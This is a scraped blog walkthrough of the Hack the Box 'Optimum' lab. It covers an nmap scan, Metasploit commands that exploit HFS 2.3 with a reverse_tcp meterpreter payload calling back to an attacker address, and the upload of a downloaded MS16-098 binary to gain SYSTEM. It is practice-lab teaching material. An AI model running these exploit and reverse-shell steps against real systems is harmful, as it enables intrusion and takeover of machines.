@@ -1,0 +1,238 @@
+
+								
+																		Hack the Box Challenge: Optimum Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 16, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge called “Optimum” which is categorized as a retired lab developed by Hack the Box for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.
+Level: Intermediate
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online, therefore they have static IP. The IP of optimum is 10.10.10.8 so let’s start with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.8
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.8
+					
+				
+			
+		
+
+From the given below image, you can observe that we found ports 80 is open for file sharing using HFS 2.3 in the victim’s network.
+
+When I Googled relative exploit I found first link for Metasploit exploit.    
+
+Then run the msfconsole command in terminal and load Metasploit framework to use the said exploit and for that type the following commands :
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/http/rejetto_hfs_exec
+msf exploit(windows/http/rejetto_hfs_exec) &gt;set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/http/rejetto_hfs_exec) &gt;set rhost 10.10.10.8
+msf exploit(windows/http/rejetto_hfs_exec) &gt;set lhost 10.10.14.6
+msf exploit(windows/http/rejetto_hfs_exec) &gt;set srvhost 10.10.14.6
+msf exploit(windows/http/rejetto_hfs_exec) &gt;exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/windows/http/rejetto_hfs_execmsf exploit(windows/http/rejetto_hfs_exec) &gt;set payload windows/x64/meterpreter/reverse_tcpmsf exploit(windows/http/rejetto_hfs_exec) &gt;set rhost 10.10.10.8msf exploit(windows/http/rejetto_hfs_exec) &gt;set lhost 10.10.14.6msf exploit(windows/http/rejetto_hfs_exec) &gt;set srvhost 10.10.14.6msf exploit(windows/http/rejetto_hfs_exec) &gt;exploit
+					
+				
+			
+		
+
+And when it works perfectly, you will get a meterpreter session 1 as shown below and by running the sysinfo command you will know about the victim’s system information.
+
+Now let’s complete this task by searching user.txt and root.txt flag which is hidden somewhere inside its directories.
+Inside c:\Document and Setting \kostas\Desktop I found the user.txt file and used the cat command to read this file.
+cat user.txt.txt
+Great!! We got our 1st flag successfully.
+
+To get root flag I really struggle a lot, all privilege escalation exploit suggested by recon/local_exploit_suggester did not work when I tried them.  Then I took help from Google and searched for exploit related to windows server and found many exploits, “MS16-098 exploit 41020” was among them.  I simply downloaded this .exe file and applied manual privilege escalation.
+
+After downloading the exe file from Google, I transferred it to target’s machine via meterpreter session; with help of following commands:
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; upload /root/Desktop/41020.exe .
+meterpreter&gt; shell
+			
+				
+					
+				
+					12
+				
+						meterpreter&gt; upload /root/Desktop/41020.exe .meterpreter&gt; shell
+					
+				
+			
+		
+
+Then after executing the whoami command, it assured me “nt authority\system”
+
+Inside c:\Document and Setting \Administrator\Desktop I found the root.txt file and used the type command to read the file.
+
+		
+		
+			
+			
+			
+			
+type root.txt
+			
+				
+					
+				
+					1
+				
+						type root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully
+And this way, we successfully solved our challenge. YAY!
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Markus Vendetta April 18, 2018 at 10:52 am							
+							
+							
+														
+							
+								Very interesting article, really good read.
+There are not so many high quality articles available on this theme.
+Thanks for the good content 🙂
+Best regards,
+Markus
+Journalist at ScanForSecurity.com
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Rojo May 23, 2018 at 4:16 pm							
+							
+							
+														
+							
+								Yo, you are amazing, that exe saved me, i was trying to do that machine for hours, following all the tutorials and nothing
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
